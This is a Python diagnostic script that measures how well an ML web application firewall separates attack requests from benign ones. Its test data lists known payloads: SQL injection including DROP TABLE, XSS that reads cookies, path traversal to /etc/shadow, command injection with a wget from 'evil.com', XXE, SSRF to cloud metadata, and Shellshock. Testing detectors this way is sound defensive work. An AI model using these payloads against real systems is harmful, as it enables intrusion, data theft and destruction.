#!/usr/bin/env python3
"""
ML Model Accuracy Diagnostic Tool
Tests the ML model on various attack types to identify accuracy issues
Author: ISRO WAF Team
"""

import os
os.environ['TOKENIZERS_PARALLELISM'] = 'false'

import sys
import json
from pathlib import Path
from typing import Dict, List
from collections import defaultdict

# Add src to path
sys.path.append(str(Path(__file__).parent))

from src.detector import WAFDetector

# Color codes for terminal output
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'


# Comprehensive attack test cases
ATTACK_TEST_CASES = {
    "SQL Injection": [
        {
            "method": "GET",
            "path": "/login.php",
            "query": {"id": "1' OR '1'='1"},
            "headers": {},
            "body": None
        },
        {
            "method": "POST",
            "path": "/search",
            "query": {},
            "headers": {"content-type": "application/x-www-form-urlencoded"},
            "body": "username=admin' OR 1=1--&password=anything"
        },
        {
            "method": "GET",
            "path": "/users",
            "query": {"id": "1 UNION SELECT NULL,username,password FROM users--"},
            "headers": {},
            "body": None
        },
        {
            "method": "GET",
            "path": "/product",
            "query": {"id": "1'; DROP TABLE users--"},
            "headers": {},
            "body": None
        },
        {
            "method": "POST",
            "path": "/login",
            "query": {},
            "headers": {"content-type": "application/json"},
            "body": '{"username": "admin\\"--", "password": "x"}'
        }
    ],
    "XSS": [
        {
            "method": "GET",
            "path": "/search",
            "query": {"q": "<script>alert('XSS')</script>"},
            "headers": {},
            "body": None
        },
        {
            "method": "GET",
            "path": "/comment",
            "query": {"text": "<img src=x onerror=alert(1)>"},
            "headers": {},
            "body": None
        },
        {
            "method": "POST",
            "path": "/post",
            "query": {},
            "headers": {"content-type": "application/json"},
            "body": '{"comment": "<svg/onload=alert(document.cookie)>"}'
        },
        {
            "method": "GET",
            "path": "/profile",
            "query": {"name": "javascript:alert('XSS')"},
            "headers": {},
            "body": None
        },
        {
            "method": "GET",
            "path": "/page",
            "query": {"data": "<iframe src=javascript:alert(1)>"},
            "headers": {},
            "body": None
        }
    ],
    "Path Traversal": [
        {
            "method": "GET",
            "path": "/download",
            "query": {"file": "../../../../etc/passwd"},
            "headers": {},
            "body": None
        },
        {
            "method": "GET",
            "path": "/read",
            "query": {"path": "..\\..\\..\\windows\\system32\\config\\sam"},
            "headers": {},
            "body": None
        },
        {
            "method": "GET",
            "path": "/include",
            "query": {"page": "../../../../../../etc/shadow"},
            "headers": {},
            "body": None
        },
        {
            "method": "GET",
            "path": "/file",
            "query": {"name": "/etc/passwd%00.jpg"},
            "headers": {},
            "body": None
        }
    ],
    "Command Injection": [
        {
            "method": "GET",
            "path": "/ping",
            "query": {"host": "127.0.0.1; cat /etc/passwd"},
            "headers": {},
            "body": None
        },
        {
            "method": "POST",
            "path": "/exec",
            "query": {},
            "headers": {"content-type": "application/x-www-form-urlencoded"},
            "body": "cmd=ls | grep secret"
        },
        {
            "method": "GET",
            "path": "/run",
            "query": {"command": "whoami && cat /etc/shadow"},
            "headers": {},
            "body": None
        },
        {
            "method": "GET",
            "path": "/system",
            "query": {"exec": "`wget http://evil.com/shell.sh`"},
            "headers": {},
            "body": None
        }
    ],
    "LDAP Injection": [
        {
            "method": "POST",
            "path": "/login",
            "query": {},
            "headers": {"content-type": "application/x-www-form-urlencoded"},
            "body": "username=admin)(&(password=*))&password=x"
        },
        {
            "method": "GET",
            "path": "/search",
            "query": {"user": "*)(uid=*))(|(uid=*"},
            "headers": {},
            "body": None
        }
    ],
    "XXE": [
        {
            "method": "POST",
            "path": "/upload",
            "query": {},
            "headers": {"content-type": "application/xml"},
            "body": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
        },
        {
            "method": "POST",
            "path": "/parse",
            "query": {},
            "headers": {"content-type": "text/xml"},
            "body": '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/secret">]><data>&xxe;</data>'
        }
    ],
    "SSRF": [
        {
            "method": "GET",
            "path": "/fetch",
            "query": {"url": "http://localhost:8080/admin"},
            "headers": {},
            "body": None
        },
        {
            "method": "POST",
            "path": "/proxy",
            "query": {},
            "headers": {"content-type": "application/json"},
            "body": '{"target": "http://169.254.169.254/latest/meta-data/"}'
        }
    ],
    "Template Injection": [
        {
            "method": "GET",
            "path": "/render",
            "query": {"name": "{{7*7}}"},
            "headers": {},
            "body": None
        },
        {
            "method": "POST",
            "path": "/template",
            "query": {},
            "headers": {"content-type": "application/json"},
            "body": '{"template": "{{config.items()}}"}'
        }
    ],
    "NoSQL Injection": [
        {
            "method": "POST",
            "path": "/login",
            "query": {},
            "headers": {"content-type": "application/json"},
            "body": '{"username": {"$ne": null}, "password": {"$ne": null}}'
        },
        {
            "method": "GET",
            "path": "/user",
            "query": {"id": "1' || '1'=='1"},
            "headers": {},
            "body": None
        }
    ],
    "HTTP Header Injection": [
        {
            "method": "GET",
            "path": "/redirect",
            "query": {"url": "http://example.com\r\nSet-Cookie: admin=true"},
            "headers": {},
            "body": None
        },
        {
            "method": "GET",
            "path": "/page",
            "query": {},
            "headers": {"X-Custom": "test\r\nInjected-Header: malicious"},
            "body": None
        }
    ],
    "Shellshock": [
        {
            "method": "GET",
            "path": "/cgi-bin/test.sh",
            "query": {},
            "headers": {"user-agent": "() { :; }; /bin/bash -c 'cat /etc/passwd'"},
            "body": None
        }
    ]
}

# Benign test cases for false positive testing
BENIGN_TEST_CASES = [
    {
        "method": "GET",
        "path": "/index.html",
        "query": {},
        "headers": {"user-agent": "Mozilla/5.0"},
        "body": None
    },
    {
        "method": "POST",
        "path": "/login",
        "query": {},
        "headers": {"content-type": "application/x-www-form-urlencoded"},
        "body": "username=john&password=secretpass123"
    },
    {
        "method": "GET",
        "path": "/api/users",
        "query": {"page": "1", "limit": "10"},
        "headers": {"authorization": "Bearer token123"},
        "body": None
    },
    {
        "method": "POST",
        "path": "/api/data",
        "query": {},
        "headers": {"content-type": "application/json"},
        "body": '{"name": "John Doe", "email": "john@example.com"}'
    },
    {
        "method": "GET",
        "path": "/search",
        "query": {"q": "normal search query"},
        "headers": {},
        "body": None
    }
]


class MLDiagnosticTester:
    """Diagnostic tester for ML model accuracy"""
    
    def __init__(
        self,
        model_path: str = "models/deberta-waf/best_model",
        calibration_file: str = "data/parsed/parsed_requests.json"
    ):
        self.model_path = model_path
        self.calibration_file = calibration_file
        self.detector = None
        
    def initialize_detector(self, threshold_percentile: float = 95.0, seed: int = 42):
        """Initialize and calibrate the detector"""
        print(f"\n{Colors.HEADER}{'='*80}{Colors.ENDC}")
        print(f"{Colors.HEADER}🔍 ML Model Accuracy Diagnostic Tool{Colors.ENDC}")
        print(f"{Colors.HEADER}{'='*80}{Colors.ENDC}\n")
        
        print(f"{Colors.OKCYAN}📦 Loading model from: {self.model_path}{Colors.ENDC}")
        print(f"{Colors.OKCYAN}🎲 Using random seed: {seed} (for reproducibility){Colors.ENDC}")
        self.detector = WAFDetector(
            model_path=self.model_path,
            threshold_percentile=threshold_percentile,
            seed=seed
        )
        
        print(f"\n{Colors.OKCYAN}📊 Loading calibration data...{Colors.ENDC}")
        with open(self.calibration_file, 'r') as f:
            benign_data = json.load(f)
        
        print(f"{Colors.OKCYAN}🎯 Calibrating on {len(benign_data)} benign samples...{Colors.ENDC}")
        self.detector.calibrate(benign_data, num_samples=len(benign_data))
        
        print(f"\n{Colors.OKGREEN}✅ Detector initialized and calibrated{Colors.ENDC}")
        print(f"{Colors.OKGREEN}   Threshold: {self.detector.anomaly_threshold:.4f}{Colors.ENDC}")
        print(f"{Colors.OKGREEN}   Baseline Mean: {self.detector.baseline_stats['mean']:.4f}{Colors.ENDC}")
        print(f"{Colors.OKGREEN}   Baseline Std: {self.detector.baseline_stats['std']:.4f}{Colors.ENDC}\n")
    
    def test_single_request(self, request: Dict, label: str) -> Dict:
        """Test a single request and return detailed results"""
        result = self.detector.detect(request)
        
        return {
            'label': label,
            'is_malicious': result.is_malicious,
            'confidence': result.confidence,
            'reconstruction_loss': result.reconstruction_loss,
            'anomaly_score': result.anomaly_score,
            'risk_level': result.risk_level,
            'z_score': result.details.get('z_score', 0),
            'threshold': result.details.get('threshold', 0),
            'request': request
        }
    
    def test_attack_type(self, attack_type: str, test_cases: List[Dict]) -> Dict:
        """Test all cases for a specific attack type"""
        print(f"\n{Colors.BOLD}Testing: {attack_type}{Colors.ENDC}")
        print("─" * 80)
        
        results = []
        detected = 0
        
        for i, test_case in enumerate(test_cases, 1):
            result = self.test_single_request(test_case, attack_type)
            results.append(result)
            
            if result['is_malicious']:
                detected += 1
                status = f"{Colors.OKGREEN}✓ DETECTED{Colors.ENDC}"
            else:
                status = f"{Colors.FAIL}✗ MISSED{Colors.ENDC}"
            
            # Show request details
            path = test_case.get('path', '/')
            query = test_case.get('query', {})
            body = test_case.get('body', '')
            
            print(f"  Test {i}: {status}")
            print(f"    Path: {path}")
            if query:
                print(f"    Query: {query}")
            if body:
                body_preview = body[:80] + '...' if len(body) > 80 else body
                print(f"    Body: {body_preview}")
            print(f"    Loss: {result['reconstruction_loss']:.4f} | Threshold: {result['threshold']:.4f}")
            print(f"    Z-Score: {result['z_score']:.2f} | Anomaly: {result['anomaly_score']:.2f}")
            print(f"    Confidence: {result['confidence']:.1f}% | Risk: {result['risk_level']}")
            print()
        
        detection_rate = (detected / len(test_cases) * 100) if test_cases else 0
        
        if detection_rate >= 80:
            color = Colors.OKGREEN
        elif detection_rate >= 50:
            color = Colors.WARNING
        else:
            color = Colors.FAIL
        
        print(f"  {color}Detection Rate: {detected}/{len(test_cases)} ({detection_rate:.1f}%){Colors.ENDC}")
        
        return {
            'attack_type': attack_type,
            'total': len(test_cases),
            'detected': detected,
            'missed': len(test_cases) - detected,
            'detection_rate': detection_rate,
            'results': results
        }
    
    def test_benign_requests(self) -> Dict:
        """Test benign requests for false positives"""
        print(f"\n{Colors.BOLD}Testing: Benign Requests (False Positive Check){Colors.ENDC}")
        print("─" * 80)
        
        results = []
        false_positives = 0
        
        for i, test_case in enumerate(BENIGN_TEST_CASES, 1):
            result = self.test_single_request(test_case, "Benign")
            results.append(result)
            
            if result['is_malicious']:
                false_positives += 1
                status = f"{Colors.FAIL}✗ FALSE POSITIVE{Colors.ENDC}"
            else:
                status = f"{Colors.OKGREEN}✓ CORRECT{Colors.ENDC}"
            
            path = test_case.get('path', '/')
            print(f"  Test {i}: {status}")
            print(f"    Path: {path}")
            print(f"    Loss: {result['reconstruction_loss']:.4f} | Threshold: {result['threshold']:.4f}")
            print(f"    Z-Score: {result['z_score']:.2f}")
            print()
        
        false_positive_rate = (false_positives / len(BENIGN_TEST_CASES) * 100) if BENIGN_TEST_CASES else 0
        
        if false_positive_rate <= 10:
            color = Colors.OKGREEN
        elif false_positive_rate <= 30:
            color = Colors.WARNING
        else:
            color = Colors.FAIL
        
        print(f"  {color}False Positive Rate: {false_positives}/{len(BENIGN_TEST_CASES)} ({false_positive_rate:.1f}%){Colors.ENDC}")
        
        return {
            'total': len(BENIGN_TEST_CASES),
            'false_positives': false_positives,
            'correct': len(BENIGN_TEST_CASES) - false_positives,
            'false_positive_rate': false_positive_rate,
            'results': results
        }
    
    def run_full_diagnostic(self):
        """Run complete diagnostic test suite"""
        all_attack_results = []
        
        print(f"\n{Colors.HEADER}{'='*80}{Colors.ENDC}")
        print(f"{Colors.HEADER}🧪 ATTACK DETECTION TESTS{Colors.ENDC}")
        print(f"{Colors.HEADER}{'='*80}{Colors.ENDC}")
        
        # Test each attack type
        for attack_type, test_cases in ATTACK_TEST_CASES.items():
            result = self.test_attack_type(attack_type, test_cases)
            all_attack_results.append(result)
        
        # Test benign requests
        benign_result = self.test_benign_requests()
        
        # Generate summary
        self.print_summary(all_attack_results, benign_result)
        
        # Save detailed results
        self.save_results(all_attack_results, benign_result)
        
        # Analyze issues
        self.analyze_issues(all_attack_results, benign_result)
    
    def print_summary(self, attack_results: List[Dict], benign_result: Dict):
        """Print diagnostic summary"""
        print(f"\n{Colors.HEADER}{'='*80}{Colors.ENDC}")
        print(f"{Colors.HEADER}📊 DIAGNOSTIC SUMMARY{Colors.ENDC}")
        print(f"{Colors.HEADER}{'='*80}{Colors.ENDC}\n")
        
        # Overall attack detection
        total_attacks = sum(r['total'] for r in attack_results)
        total_detected = sum(r['detected'] for r in attack_results)
        overall_detection = (total_detected / total_attacks * 100) if total_attacks > 0 else 0
        
        print(f"{Colors.BOLD}Attack Detection:{Colors.ENDC}")
        print(f"  Total Attack Samples: {total_attacks}")
        print(f"  Detected: {total_detected}")
        print(f"  Missed: {total_attacks - total_detected}")
        
        if overall_detection >= 80:
            color = Colors.OKGREEN
        elif overall_detection >= 50:
            color = Colors.WARNING
        else:
            color = Colors.FAIL
        print(f"  {color}Overall Detection Rate: {overall_detection:.1f}%{Colors.ENDC}\n")
        
        # Per-attack type breakdown
        print(f"{Colors.BOLD}Detection by Attack Type:{Colors.ENDC}")
        for result in sorted(attack_results, key=lambda x: x['detection_rate']):
            rate = result['detection_rate']
            if rate >= 80:
                color = Colors.OKGREEN
                symbol = "✓"
            elif rate >= 50:
                color = Colors.WARNING
                symbol = "⚠"
            else:
                color = Colors.FAIL
                symbol = "✗"
            
            print(f"  {color}{symbol} {result['attack_type']}: {result['detected']}/{result['total']} ({rate:.1f}%){Colors.ENDC}")
        
        # False positives
        print(f"\n{Colors.BOLD}Benign Traffic (False Positives):{Colors.ENDC}")
        fp_rate = benign_result['false_positive_rate']
        if fp_rate <= 10:
            color = Colors.OKGREEN
        elif fp_rate <= 30:
            color = Colors.WARNING
        else:
            color = Colors.FAIL
        print(f"  {color}False Positive Rate: {fp_rate:.1f}%{Colors.ENDC}")
        print(f"  Total Benign: {benign_result['total']}")
        print(f"  Incorrectly Flagged: {benign_result['false_positives']}")
    
    def analyze_issues(self, attack_results: List[Dict], benign_result: Dict):
        """Analyze and report potential issues"""
        print(f"\n{Colors.HEADER}{'='*80}{Colors.ENDC}")
        print(f"{Colors.HEADER}🔍 ISSUE ANALYSIS{Colors.ENDC}")
        print(f"{Colors.HEADER}{'='*80}{Colors.ENDC}\n")
        
        issues_found = []
        
        # Check for low detection rates
        poor_detection = [r for r in attack_results if r['detection_rate'] < 50]
        if poor_detection:
            issues_found.append("LOW_DETECTION")
            print(f"{Colors.FAIL}❌ Issue 1: Poor Detection Rate{Colors.ENDC}")
            print(f"   Attack types with <50% detection:")
            for r in poor_detection:
                print(f"   - {r['attack_type']}: {r['detection_rate']:.1f}%")
            print()
        
        # Check for high false positives
        if benign_result['false_positive_rate'] > 20:
            issues_found.append("HIGH_FALSE_POSITIVES")
            print(f"{Colors.FAIL}❌ Issue 2: High False Positive Rate{Colors.ENDC}")
            print(f"   {benign_result['false_positive_rate']:.1f}% of benign requests flagged as attacks")
            print()
        
        # Analyze reconstruction loss patterns
        print(f"{Colors.BOLD}Loss Analysis:{Colors.ENDC}")
        
        # Collect all losses
        attack_losses = []
        benign_losses = []
        
        for attack_result in attack_results:
            for r in attack_result['results']:
                attack_losses.append(r['reconstruction_loss'])
        
        for r in benign_result['results']:
            benign_losses.append(r['reconstruction_loss'])
        
        if attack_losses and benign_losses:
            import numpy as np
            avg_attack_loss = np.mean(attack_losses)
            avg_benign_loss = np.mean(benign_losses)
            threshold = self.detector.anomaly_threshold
            
            print(f"   Average Attack Loss: {avg_attack_loss:.4f}")
            print(f"   Average Benign Loss: {avg_benign_loss:.4f}")
            print(f"   Threshold: {threshold:.4f}")
            print(f"   Separation: {avg_attack_loss - avg_benign_loss:.4f}")
            
            if avg_attack_loss < threshold:
                issues_found.append("THRESHOLD_TOO_HIGH")
                print(f"\n{Colors.WARNING}⚠️  Issue 3: Threshold Too High{Colors.ENDC}")
                print(f"   Average attack loss ({avg_attack_loss:.4f}) is below threshold ({threshold:.4f})")
                print(f"   Recommendation: Lower threshold_percentile (try 85-90 instead of 95)")
                print()
            
            if (avg_attack_loss - avg_benign_loss) < 0.5:
                issues_found.append("POOR_SEPARATION")
                print(f"\n{Colors.WARNING}⚠️  Issue 4: Poor Loss Separation{Colors.ENDC}")
                print(f"   Attack and benign losses are too close")
                print(f"   Possible causes:")
                print(f"   - Model not trained well on benign traffic patterns")
                print(f"   - Calibration data doesn't match test data distribution")
                print(f"   - Attack payloads too similar to benign traffic")
                print()
        
        # Recommendations
        if issues_found:
            print(f"{Colors.HEADER}{'='*80}{Colors.ENDC}")
            print(f"{Colors.HEADER}💡 RECOMMENDATIONS{Colors.ENDC}")
            print(f"{Colors.HEADER}{'='*80}{Colors.ENDC}\n")
            
            if "LOW_DETECTION" in issues_found or "THRESHOLD_TOO_HIGH" in issues_found:
                print(f"{Colors.OKCYAN}1. Adjust Detection Threshold:{Colors.ENDC}")
                print(f"   Try running with lower threshold_percentile:")
                print(f"   python diagnose_ml_accuracy.py --threshold 85")
                print(f"   python diagnose_ml_accuracy.py --threshold 80")
                print()
            
            if "POOR_SEPARATION" in issues_found:
                print(f"{Colors.OKCYAN}2. Retrain Model:{Colors.ENDC}")
                print(f"   Model may need retraining with more diverse benign data")
                print(f"   Ensure training data covers normal application usage patterns")
                print()
            
            if "HIGH_FALSE_POSITIVES" in issues_found:
                print(f"{Colors.OKCYAN}3. Calibration Data:{Colors.ENDC}")
                print(f"   Ensure calibration data matches production traffic patterns")
                print(f"   Consider using more calibration samples")
                print()
        else:
            print(f"{Colors.OKGREEN}✅ No major issues detected!{Colors.ENDC}")
            print(f"{Colors.OKGREEN}   Model appears to be performing well.{Colors.ENDC}\n")
    
    def save_results(self, attack_results: List[Dict], benign_result: Dict):
        """Save detailed results to file"""
        output = {
            'timestamp': str(Path(__file__).stat().st_mtime),
            'model_path': self.model_path,
            'threshold': float(self.detector.anomaly_threshold),
            'baseline_stats': self.detector.baseline_stats,
            'attack_results': attack_results,
            'benign_results': benign_result
        }
        
        output_file = "reports/ml_diagnostic_results.json"
        os.makedirs("reports", exist_ok=True)
        
        with open(output_file, 'w') as f:
            json.dump(output, f, indent=2)
        
        print(f"\n{Colors.OKCYAN}💾 Detailed results saved to: {output_file}{Colors.ENDC}")


def main():
    """Main entry point"""
    import argparse
    
    parser = argparse.ArgumentParser(description="ML Model Accuracy Diagnostic Tool")
    parser.add_argument(
        '--model',
        default='models_30k/deberta-waf/best_model',
        help='Path to trained model'
    )
    parser.add_argument(
        '--calibration',
        default='data/parsed/parsed_requests.json',
        help='Path to calibration data'
    )
    parser.add_argument(
        '--threshold',
        type=float,
        default=95.0,
        help='Detection threshold percentile (default: 95.0)'
    )
    parser.add_argument(
        '--seed',
        type=int,
        default=42,
        help='Random seed for reproducibility (default: 42)'
    )
    
    args = parser.parse_args()
    
    # Check if model exists
    if not os.path.exists(args.model):
        print(f"{Colors.FAIL}❌ Error: Model not found at {args.model}{Colors.ENDC}")
        print(f"{Colors.WARNING}Please train the model first using src/trainer.py{Colors.ENDC}")
        sys.exit(1)
    
    # Check if calibration data exists
    if not os.path.exists(args.calibration):
        print(f"{Colors.FAIL}❌ Error: Calibration data not found at {args.calibration}{Colors.ENDC}")
        print(f"{Colors.WARNING}Please run the parser first to generate benign data{Colors.ENDC}")
        sys.exit(1)
    
    # Run diagnostic
    tester = MLDiagnosticTester(
        model_path=args.model,
        calibration_file=args.calibration
    )
    
    tester.initialize_detector(threshold_percentile=args.threshold, seed=args.seed)
    tester.run_full_diagnostic()
    
    print(f"\n{Colors.HEADER}{'='*80}{Colors.ENDC}")
    print(f"{Colors.OKGREEN}✅ Diagnostic complete!{Colors.ENDC}")
    print(f"{Colors.HEADER}{'='*80}{Colors.ENDC}\n")


if __name__ == "__main__":
    main()
